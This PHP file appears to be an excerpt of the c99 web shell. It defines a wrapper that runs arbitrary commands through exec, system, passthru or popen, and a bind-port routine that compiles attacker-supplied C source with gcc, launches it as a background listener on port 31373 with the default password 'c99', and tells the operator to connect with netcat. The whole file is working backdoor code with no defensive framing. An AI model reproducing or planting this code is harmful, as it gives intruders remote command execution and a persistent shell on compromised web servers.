<?php
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (is_callable("system")) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru")) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}


$bindport_pass = "c99";  // default password for binding
$bindport_port = "31373"; // default port for binding


$bind["src"] = $_POST['bind_src'];
$bind["port"] = $bindport_port;
$bind["pass"] = $bindport_pass = "c99";

$w = explode(".",$bind["src"]);
$ext = $w[count($w)-1];
$tmpdir = getcwd();
$srcpath = join(".",$w).".".rand(0,999).".".$ext;
$binpath = $tmpdir.join(".",$w).rand(0,999);

if ($ext == "c") {
	$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  
	@unlink($srcpath);
}
$v[1] = str_replace("%path",$binpath,$v[1]);
$v[1] = str_replace("%port",$bind["port"],$v[1]);
$v[1] = str_replace("%pass",$bind["pass"],$v[1]);
$v[1] = str_replace("//","/",$v[1]);
$retbind = myshellexec($v[1]." > /dev/null &");
sleep(5);
$sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}
   
   
?>